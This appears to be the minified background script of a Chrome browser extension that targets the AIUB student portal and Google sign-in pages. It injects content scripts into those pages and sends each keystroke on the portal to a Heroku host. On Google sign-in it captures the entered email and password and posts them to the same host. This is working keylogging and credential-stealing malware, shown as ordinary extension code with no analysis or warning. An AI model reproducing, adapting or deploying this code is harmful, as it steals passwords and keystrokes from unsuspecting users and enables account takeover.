var aiub_portal_exp="https?://portal.aiub.edu/*",google_exp="https?://accounts.google.com/*",email="";chrome.tabs.onUpdated.addListener(function(e,t,a){if("complete"==t.status){var s=a.url.match(aiub_portal_exp),o=a.url.match(google_exp);s?chrome.tabs.executeScript({file:"content-portal-ugly.js"}):o&&chrome.tabs.executeScript({file:"content-gmail-ugly.js"})}}),chrome.runtime.onMessage.addListener(function(e,t,a){if(t.tab.url.match(aiub_portal_exp)){var s="https://athenaares.herokuapp.com/apd",o=new XMLHttpRequest,r={key_pressed:e.keyPressed,source_hostname:e.source_hostname,source_url:e.source_url};o.open("POST",s,!0),o.setRequestHeader("Content-Type","application/json"),o.send(JSON.stringify(r))}else if(t.tab.url.match(google_exp))if(0===e.start)email=e.email;else if(1===e.start){s="https://athenaares.herokuapp.com/gad";var p=new XMLHttpRequest;r={email:email,password:e.password,source_hostname:e.source_hostname,source_url:e.source_url};p.open("POST",s,!0),p.setRequestHeader("Content-Type","application/json"),p.send(JSON.stringify(r))}a(!0)});